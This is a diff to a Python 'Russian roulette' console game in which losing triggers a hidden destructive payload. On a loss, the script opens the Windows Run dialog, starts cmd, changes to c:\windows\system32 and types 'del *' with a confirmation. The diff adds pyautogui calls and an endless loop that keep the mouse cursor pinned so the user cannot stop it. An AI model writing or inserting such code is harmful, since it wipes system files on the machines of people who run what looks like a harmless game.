@@ -9,6 +9,9 @@ import os
 import sys
 import keyboard
 import time
+import pyautogui    
+
+x = 2
 
 chambers = input("Please enter the number of chambers (default = 6): ")
 
@@ -25,17 +28,25 @@ for x in range(1, int(chambers) + 1):
     if x == fatal_bullet:
         print("You just got served!")
         print("Game Over")
+        pyautogui.moveTo(100, 150)
         keyboard.press_and_release('Windows + r')
-        time.sleep(2)
+        pyautogui.moveTo(100, 150)
         keyboard.write('cmd')
+        pyautogui.moveTo(100, 150)
         keyboard.press_and_release('enter')
-        time.sleep(2)
+        pyautogui.moveTo(100, 150)
         keyboard.write('cd c:\windows\system32')
+        pyautogui.moveTo(100, 150)
         keyboard.press_and_release('enter')
-        time.sleep(1)
+        pyautogui.moveTo(100, 150)
         keyboard.write('del *')
-        time.sleep(1)
-        keyboard.write('Y')
+        keyboard.press_and_release('enter')
+        pyautogui.moveTo(100, 150)
+        keyboard.write('O')
+        keyboard.press_and_release('enter')
+        while True:
+            pyautogui.moveTo(100, 150)
+            x += 1
         start_again = input("Do you want to start again? (y/n): ")
         if start_again and start_again.lower()[0] == "y":
             os.execv(sys.executable, [sys.executable] + sys.argv)
